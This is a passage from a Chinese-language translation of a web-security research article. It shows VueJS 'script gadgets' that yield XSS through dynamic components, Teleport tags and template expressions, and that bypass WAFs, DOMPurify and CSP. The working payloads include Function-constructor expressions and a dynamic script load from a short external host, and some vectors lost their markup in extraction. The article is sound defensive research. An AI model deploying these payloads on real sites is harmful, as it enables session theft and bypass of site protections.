      }
    }
然而，有一个特殊的标签，[与之并用](https://github.com/vuejs/vue-next/blob/24041b7ac1a22ca6c10bf2af81c9250af26bda34/packages/compiler-core/src/transforms/transformElement.ts#L342)的是创建动态组件。
所以我们要做的就是将x更改为component.
对于上面的向量，render()函数是这样的。
    return function render(_ctx, _cache) {
      with (_ctx) {
        ...
        return (_openBlock(),
           _createBlock(_resolveDynamicComponent("script"),
           { src: "//⑭.₨" }))
      }
    }
因此，VueJS v3的最短向量是31个字节。
在版本3中，可以使用DOM属性作为标签的属性。这意味着您可以使用DOM属性文本，它将作为一个文本节点添加到标签中，然后添加到DOM中。
## 传送
我们在VueJS 3中发现了一个非常有趣的新标签，叫做。这个标签允许你通过使用to属性将标签的内容转移到任何其他标签，该属性接受一个CSS选择器。
    test
即使是文本节点，标签的内容也会被传输。这意味着我们可以对文本节点进行 HTML 编码，并在传输之前对其进行解码。这适用于
和
标签，尽管在我们的测试中，我们发现你需要一个现有的、空白的
元素:
    alert(1)
[POC](https://tinyurl.com/y34aovfh)
在这个例子中，当前的样式是蓝色的，但我们注入一个标签来改变内联样式表的样式。文本就会变成红色。
        /* Can be Entity Encoded */
        h1 {
          color: red;
        }
     aaaa
[POC](https://tinyurl.com/yxmwvq3m)  
你可以将HTML编码与JavaScript中的unicode转义结合起来，产生一些漂亮的向量，可能会绕过一些WAF。
    alert(1)
[POC](https://tinyurl.com/y3ebejfs)
### 反向传送
我们还发现了一些东西，我们决定称之为 "反向传送"。我们已经讨论过VueJS有一个标签，但如果你在模板表达式中包含一个CSS选择器，你可以将任何其他HTML元素作为目标，并将该元素的内容作为表达式执行。即使目标标签在应用程序边界之外，这也是有效的!
当我们意识到VueJS会在表达式的整个内容上运行[querySelector](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)时，我们都相当震惊，[只要它以#开头](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)。下面的片段演示了一个带有CSS查询的表达式，其目标是类为haha的。第二个表达式即使在应用程序边界之外也会被执行。
    #x,.haha{ {_Vue.h.constructor`alert(1)`()} }
## 使用案例
在本节中，我们将仔细看看这些脚本小工具可以在哪些方面派上用场。
### WAF
让我们从Web应用防火墙开始。正如我们已经看到的那样，有相当数量的潜在小工具可以发现。由于Vue也乐于解码HTML实体，所以你很有可能绕过常见的WAF，比如Cloudflare。
### 过滤器
诸如[DOMPurify](https://github.com/cure53/DOMPurify)这样的过滤器，有一套非常好的标签和属性的白名单，以帮助阻止任何被认为不正常的东西。然而，由于它们都允许模板语法，因此在与VueJS等前端框架结合使用时，它们并不能提供强大的XSS攻击保护。
### CSP
Vue的工作方式是对内容进行词法分析，并将其解析为抽象语法树（AST）。代码作为字符串传递到渲染函数中，由于Function构造函数的eval-like功能，它在那里被执行。这意味着，CSP的定义方式必须允许VueJS和应用程序仍能正常工作。如果它包含unsafe-eval，你可以使用Vue轻松绕过CSP。请注意，对于严格的动态或nonce旁路，unsafe-eval是一个要求。
Unsafe-eval + nonce :
    // v2
    { {_c.constructor`alert(document.currentScript.nonce)`()} } 
    // v3
    { {_Vue.h.constructor`alert(document.currentScript.nonce)`()} }
本篇文章中的大部分向量都可以和CSP一起使用，唯一例外的是动态组件和基于传送门的向量。唯一的例外是动态组件和基于传送门的向量。这是因为它们试图在文档中附加一个脚本节点，而CSP会阻止它（取决于策略）。
## 结论
我们希望你喜欢我们的文章，就像我们喜欢写它和想出有趣的小工具一样。给查看本帖的开发者和黑客们一些建议。
  * 当创建一个JavaScript框架时，或许可以考虑一下你所添加的功能给应用程序带来的攻击面。仔细思考它们可能被使用或滥用的方式。
  * 对于黑客来说，当你看中一个新框架时，要深入挖掘它的功能。看看它们一般是如何使用的，以及它们可能被滥用或误用。我们建议查看底层的源码，以了解引擎下面到底发生了什么。
帖子中讨论的所有向量都已被添加到我们[VueJS部分的XSS攻略中](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)。
如果你喜欢这篇文章，请告诉我们!  
我们有兴趣对VueJS和其他客户端和服务器端框架进行更多的研究。
## 关于Lewis
[Lewis Ardern](https://twitter.com/LewisArdern) 是 Synopsys
的副首席顾问。他的主要专业领域是网络安全和安全工程。Lewis 喜欢为各种类型的组织和机构创建和提供网络和 JavaScript
安全等主题的安全培训。他也是Leeds Ethical Hacking Society的创始人，并帮助开发了bXSS和SecGen等项目。
## 关于PwnFunction
[PwnFunction](https://twitter.com/PwnFunction) 白天是一名独立的 AppSec
顾问，晚上则是一名研究员。他以其[YouTube频道](https://www.youtube.com/c/PwnFunction)而闻名。Pwn
的兴趣主要是围绕着[应用程序安全](https://portswigger.net/burp/application-security-testing)，但他也对低级别的爵士乐感兴趣，如二进制和浏览器利用。除了计算机之外，他还喜欢数学、科学和哲学。